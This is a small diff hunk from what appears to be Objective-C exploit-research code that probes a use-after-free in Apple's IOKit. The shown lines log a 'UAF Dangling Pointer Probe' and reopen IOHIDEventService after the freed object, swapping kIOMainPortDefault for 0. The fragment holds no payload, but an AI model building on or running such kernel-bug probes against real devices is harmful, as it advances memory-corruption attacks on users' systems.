@@ -3965,7 +3965,7 @@ static const char kOpenPropertiesGarbage[] =
 
     // ---- Probe: open NEW connection to same provider after UAF ----
     [self appendLog:@"\n====== UAF Dangling Pointer Probe ======"];
-    io_service_t probeSvc = sIOServiceGetMatchingService(kIOMainPortDefault,
+    io_service_t probeSvc = sIOServiceGetMatchingService(0,
         sIOServiceMatching("IOHIDEventService"));
     [self appendLog:[NSString stringWithFormat:@"  IOHIDEventService: 0x%x", probeSvc]];
     if (probeSvc != MACH_PORT_NULL) {
